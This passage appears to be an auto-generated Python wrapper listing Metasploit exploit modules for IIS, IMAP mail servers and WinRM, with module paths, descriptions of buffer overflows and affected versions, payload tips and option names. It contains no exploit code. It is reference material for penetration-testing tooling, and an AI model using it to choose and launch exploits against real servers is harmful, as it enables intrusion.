			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			CMDSTAGER_FLAVOR = 'CMDSTAGER::FLAVOR'
			CMDSTAGER_DECODER = 'CMDSTAGER::DECODER'
			WINDIR = 'WINDIR'
			CMD = 'CMD'

	class windows_iis_ms02_018_htr(object):
		"""
		
          This exploits a buffer overflow in the ISAPI ISM.DLL used to
        process HTR scripting in IIS 4.0. This module works against
        Windows NT 4 Service Packs  3, 4, and 5. The server will
        continue to process requests until the payload being
        executed has exited. If you've set EXITFUNC to 'seh', the
        server will continue processing requests, but you will have
        trouble terminating a bind shell. If you set EXITFUNC to
        thread, the server will crash upon exit of the bind shell.
        The payload is alpha-numerically encoded without a NOP sled
        because otherwise the data gets mangled by the filters.
      
		"""

		path = 'windows/iis/ms02_018_htr'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_iis_iis_webdav_upload_asp(object):
		"""
		
          This module can be used to execute a payload on IIS servers that
        have world-writeable directories. The payload is uploaded as an ASP
        script via a WebDAV PUT request.

          The target IIS machine must meet these conditions to be considered
        as exploitable: It allows 'Script resource access', Read and Write
        permission, and supports ASP.
      
		"""

		path = 'windows/iis/iis_webdav_upload_asp'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			required_PATH = 'PATH'
			required_METHOD = 'METHOD'

	class windows_iis_ms03_007_ntdll_webdav(object):
		"""
		
        This exploits a buffer overflow in NTDLL.dll on Windows 2000
        through the SEARCH WebDAV method in IIS. This particular
        module only works against Windows 2000. It should have a
        reasonable chance of success against any service pack.
      
		"""

		path = 'windows/iis/ms03_007_ntdll_webdav'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			InvalidSearchRequest = 'InvalidSearchRequest'
			HTTP_uri_encode = 'HTTP::uri_encode'

	class windows_iis_ms01_023_printer(object):
		"""
		
          This exploits a buffer overflow in the request processor of
        the Internet Printing Protocol ISAPI module in IIS. This
        module works against Windows 2000 service pack 0 and 1. If
        the service stops responding after a successful compromise,
        run the exploit a couple more times to completely kill the
        hung process.
      
		"""

		path = 'windows/iis/ms01_023_printer'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_imap_mercury_login(object):
		"""
		
        This module exploits a stack buffer overflow in Mercury/32 <= 4.01b IMAPD
        LOGIN verb. By sending a specially crafted login command, a buffer
        is corrupted, and code execution is possible. This vulnerability was
        discovered by (mu-b at digit-labs.org).
      
		"""

		path = 'windows/imap/mercury_login'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_imap_mdaemon_cram_md5(object):
		"""
		
          This module exploits a buffer overflow in the CRAM-MD5
        authentication of the MDaemon IMAP service. This
        vulnerability was discovered by Muts.
      
		"""

		path = 'windows/imap/mdaemon_cram_md5'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			IMAPUSER = 'IMAPUSER'
			IMAPPASS = 'IMAPPASS'

	class windows_imap_eudora_list(object):
		"""
		
        This module exploits a stack buffer overflow in the Qualcomm WorldMail IMAP Server
        version 3.0 (builds 6.1.19.0 through 6.1.22.0). Version 6.1.22.1 fixes this
        particular vulnerability.

        NOTE: The service does NOT restart automatically by default. You may be limited to
        only one attempt, so choose wisely!
      
		"""

		path = 'windows/imap/eudora_list'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			IMAPUSER = 'IMAPUSER'
			IMAPPASS = 'IMAPPASS'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_imap_mercur_imap_select_overflow(object):
		"""
		
          Mercur v5.0 IMAP server is prone to a remotely exploitable
        stack-based buffer overflow vulnerability. This issue is due
        to a failure of the application to properly bounds check
        user-supplied data prior to copying it to a fixed size memory buffer.
        Credit to Tim Taylor for discover the vulnerability.
      
		"""

		path = 'windows/imap/mercur_imap_select_overflow'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			IMAPUSER = 'IMAPUSER'
			IMAPPASS = 'IMAPPASS'

	class windows_imap_mercury_rename(object):
		"""
		
          This module exploits a stack buffer overflow vulnerability in the
        Mercury/32 v.4.01a IMAP service.
      
		"""

		path = 'windows/imap/mercury_rename'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			IMAPUSER = 'IMAPUSER'
			IMAPPASS = 'IMAPPASS'

	class windows_imap_imail_delete(object):
		"""
		
          This module exploits a buffer overflow in the 'DELETE'
        command of the the IMail IMAP4D service. This vulnerability
        can only be exploited with a valid username and password.
        This flaw was patched in version 8.14.
      
		"""

		path = 'windows/imap/imail_delete'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			IMAPUSER = 'IMAPUSER'
			IMAPPASS = 'IMAPPASS'

	class windows_imap_ipswitch_search(object):
		"""
		
          This module exploits a stack buffer overflow in Ipswitch IMail Server 2006.1 IMAP SEARCH
        verb. By sending an overly long string, an attacker can overwrite the
        buffer and control program execution.
        In order for this module to be successful, the IMAP user must have at least one
        message.
      
		"""

		path = 'windows/imap/ipswitch_search'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			IMAPUSER = 'IMAPUSER'
			IMAPPASS = 'IMAPPASS'

	class windows_imap_mdaemon_fetch(object):
		"""
		
          This module exploits a stack buffer overflow in the Alt-N MDaemon IMAP Server
        version 9.6.4 by sending an overly long FETCH BODY command. Valid IMAP
        account credentials are required. Credit to Matteo Memelli
      
		"""

		path = 'windows/imap/mdaemon_fetch'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			IMAPUSER = 'IMAPUSER'
			IMAPPASS = 'IMAPPASS'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_imap_mailenable_login(object):
		"""
		
          MailEnable's IMAP server contains a buffer overflow
        vulnerability in the Login command.
      
		"""

		path = 'windows/imap/mailenable_login'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_imap_novell_netmail_subscribe(object):
		"""
		
          This module exploits a stack buffer overflow in Novell's NetMail 3.52 IMAP SUBSCRIBE
        verb. By sending an overly long string, an attacker can overwrite the
        buffer and control program execution.
      
		"""

		path = 'windows/imap/novell_netmail_subscribe'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			IMAPUSER = 'IMAPUSER'
			IMAPPASS = 'IMAPPASS'

	class windows_imap_mailenable_status(object):
		"""
		
          MailEnable's IMAP server contains a buffer overflow
        vulnerability in the STATUS command. With proper
        credentials, this could allow for the execution of arbitrary
        code.
      
		"""

		path = 'windows/imap/mailenable_status'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			IMAPUSER = 'IMAPUSER'
			IMAPPASS = 'IMAPPASS'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_imap_novell_netmail_auth(object):
		"""
		
          This module exploits a stack buffer overflow in Novell's NetMail 3.52 IMAP AUTHENTICATE
        GSSAPI command. By sending an overly long string, an attacker can overwrite the
        buffer and control program execution. Using the PAYLOAD of windows/shell_bind_tcp
        or windows/shell_reverse_tcp allows for the most reliable results.
      
		"""

		path = 'windows/imap/novell_netmail_auth'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_imap_mailenable_w3c_select(object):
		"""
		
          This module exploits a buffer overflow in the W3C logging
        functionality of the MailEnable IMAPD service. Logging is
        not enabled by default and this exploit requires a valid
        username and password to exploit the flaw. MailEnable
        Professional version 1.6 and prior and MailEnable Enterprise
        version 1.1 and prior are affected.
      
		"""

		path = 'windows/imap/mailenable_w3c_select'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			IMAPUSER = 'IMAPUSER'
			IMAPPASS = 'IMAPPASS'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_imap_novell_netmail_status(object):
		"""
		
          This module exploits a stack buffer overflow in Novell's Netmail 3.52 IMAP STATUS
        verb. By sending an overly long string, an attacker can overwrite the
        buffer and control program execution.
      
		"""

		path = 'windows/imap/novell_netmail_status'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			IMAPUSER = 'IMAPUSER'
			IMAPPASS = 'IMAPPASS'

	class windows_imap_mercur_login(object):
		"""
		
          This module exploits a stack buffer overflow in Atrium Mercur IMAP 5.0 SP3.
        Since the room for shellcode is small, using the reverse ordinal payloads
        yields the best results.
      
		"""

		path = 'windows/imap/mercur_login'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_imap_novell_netmail_append(object):
		"""
		
          This module exploits a stack buffer overflow in Novell's Netmail 3.52 IMAP APPEND
        verb. By sending an overly long string, an attacker can overwrite the
        buffer and control program execution.
      
		"""

		path = 'windows/imap/novell_netmail_append'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			IMAPUSER = 'IMAPUSER'
			IMAPPASS = 'IMAPPASS'

	class windows_winrm_winrm_script_exec(object):
		"""
		
          This module uses valid credentials to login to the WinRM service
          and execute a payload. It has two available methods for payload
          delivery: Powershell 2.0 and VBS CmdStager.

          The module will check if Powershell 2.0 is available, and if so uses
          that method. Otherwise it falls back to the VBS CmdStager which is
          less stealthy.

          IMPORTANT: If targeting an x64 system with the Powershell method
          you MUST select an x64 payload. An x86 payload will never return.
      
		"""

		path = 'windows/winrm/winrm_script_exec'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_NTLM_UseNTLMv2 = 'NTLM::UseNTLMv2'
			required_NTLM_UseNTLM2_session = 'NTLM::UseNTLM2_session'
			required_NTLM_SendLM = 'NTLM::SendLM'
			required_NTLM_UseLMKey = 'NTLM::UseLMKey'
			required_NTLM_SendNTLM = 'NTLM::SendNTLM'
			required_NTLM_SendSPN = 'NTLM::SendSPN'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
